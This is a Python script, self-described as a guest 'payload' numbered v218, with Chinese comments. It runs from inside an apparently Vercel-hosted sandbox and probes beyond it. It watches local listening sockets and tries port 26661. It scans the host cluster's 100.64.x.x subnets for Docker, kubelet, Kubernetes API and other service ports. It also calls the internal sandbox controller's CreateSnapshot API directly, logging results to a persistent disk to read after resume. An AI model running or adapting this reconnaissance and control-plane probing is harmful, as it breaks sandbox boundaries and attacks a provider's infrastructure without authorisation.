# -*- coding: utf-8 -*-
"""v218 payload (guest): 26661 条件监听时序观察 + host 集群网段扫描
1) 后台线程 A: 每 400ms 快照 tcp6/tcp LISTEN + 试连 26661 (127.0.0.1 / ::1 / [::])
2) 后台线程 B: 100.64.1.0/24 + 100.64.0.0/24 扫描 (23456/26661/80/443/8080)
3) 主线程: 6s 后触发 CreateSnapshot (driveId=sandbox) -> 观察 stopped 前 26661 是否出现
输出 /vercel/sandbox/v218c.out (COW 持久盘, resume 后可读)"""
import socket, struct, time, json, signal, threading

OUT = '/vercel/sandbox/v218c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(120)
LOCK = threading.Lock()


def log(s, maxlen=3000):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC]'
    with LOCK:
        try:
            f.write('[%.1f] %s\n' % (time.time(), s))
            f.flush()
        except Exception:
            pass
    print(s[:400], flush=True)


# ---------- tcp6 解析 ----------
def parse_tcp(path):
    """返回 [(addr, port, uid, inode, st)]"""
    rows = []
    try:
        for ln in open(path).read().splitlines()[1:]:
            p = ln.split()
            if len(p) < 10:
                continue
            loc, st, uid, inode = p[1], p[3], p[7], p[9]
            if st != '0A':
                continue
            if ':' in loc:
                hx, port = loc.rsplit(':', 1)
                port = int(port, 16)
                rows.append((hx, port, uid, inode))
    except Exception:
        pass
    return rows


def fmt_addr(hx):
    if hx.startswith('0000000000000000FFFF0000'):
        return '::ffff:' + '.'.join(str(int(hx[i:i + 2], 16)) for i in (-8, -6, -4, -2))
    if hx == '00000000000000000000000000000000':
        return '::'
    if hx == '00000000000000000000000001000000':
        return '::1'
    return hx


# ---------- 线程 A: 时序观察 ----------
def watcher():
    t0 = time.time()
    last = set()
    while time.time() - t0 < 40:
        try:
            tcp = parse_tcp('/proc/net/tcp')
            tcp6 = parse_tcp('/proc/net/tcp6')
            all6 = sorted(set((fmt_addr(h), p, u, i) for h, p, u, i in tcp6))
            cur = set(all6)
            new = cur - last
            gone = last - cur
            if new:
                for a, p, u, i in sorted(new):
                    log('LISTEN_NEW %s:%d uid=%s inode=%s' % (a, p, u, i))
            if gone:
                for a, p, u, i in sorted(gone):
                    log('LISTEN_GONE %s:%d uid=%s inode=%s' % (a, p, u, i))
            last = cur
            # 试连 26661 全变体
            for af, addr in [('v4', ('127.0.0.1', 26661)),
                             ('v6-1', ('::1', 26661)),
                             ('v6-any', ('::', 26661))]:
                try:
                    s = socket.socket(socket.AF_INET6 if af != 'v4' else socket.AF_INET,
                                      socket.SOCK_STREAM)
                    s.settimeout(0.35)
                    rc = s.connect_ex(addr)
                    s.close()
                    if rc == 0:
                        log('26661_OPEN %s' % af)
                    else:
                        log('26661_%s rc=%d' % (af, rc))
                except Exception as e:
                    log('26661_%s EXC %s' % (af, type(e).__name__))
        except Exception as e:
            log('WATCH EXC %s' % e)
        time.sleep(0.4)
    log('WATCHER_DONE')


# ---------- 线程 B: host 集群网段扫描 ----------
SCAN_PORTS = [23456, 26661, 80, 443, 8080, 2375, 8502, 10250, 6443, 3000]
open_hits = []


def scan_ip(ip):
    for p in SCAN_PORTS:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.4)
            rc = s.connect_ex((ip, p))
            if rc == 0:
                log('SCAN_OPEN %s:%d' % (ip, p))
                open_hits.append((ip, p))
            s.close()
        except Exception:
            pass


def scanner():
    t0 = time.time()
    ths = []
    # 100.64.1.0/24 全扫 + 100.64.0.0/24 (除自己/网关) + 100.64.2.0/24 前 32 个
    targets = []
    for i in range(1, 255):
        targets.append('100.64.1.%d' % i)
        if i < 32:
            targets.append('100.64.2.%d' % i)
        if i <= 16:
            targets.append('100.64.0.%d' % i)
    for ip in targets:
        if len(ths) >= 24:
            ths[0].join(timeout=5)
            ths = ths[1:]
        t = threading.Thread(target=scan_ip, args=(ip,))
        t.start()
        ths.append(t)
    for t in ths:
        t.join(timeout=5)
    log('SCANNER_DONE hits=%s t=%.0f' % (open_hits, time.time() - t0))


# ---------- 主线程: 触发 CreateSnapshot ----------
CTRL = 'vercel.sandbox.api.controller.v1.ControllerService'


def post_snap(port, path, body, t=6):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(('127.0.0.1', port))
        hdrs = 'POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 4000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:3000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def main():
    log('V218_START')
    w = threading.Thread(target=watcher, daemon=True)
    s = threading.Thread(target=scanner, daemon=True)
    w.start()
    s.start()
    time.sleep(6)
    log('TRIGGER CreateSnapshot driveId=sandbox')
    st, pay = post_snap(23456, '/' + CTRL + '/CreateSnapshot',
                        {'driveId': 'sandbox', 'bucketBaseUrl': 's3://v1.vercel.com/snap/v218'}, t=6)
    log('SNAP_RESP %s %r' % (st, pay[:1500]))
    time.sleep(5)
    log('V218_DONE')


if __name__ == '__main__':
    main()
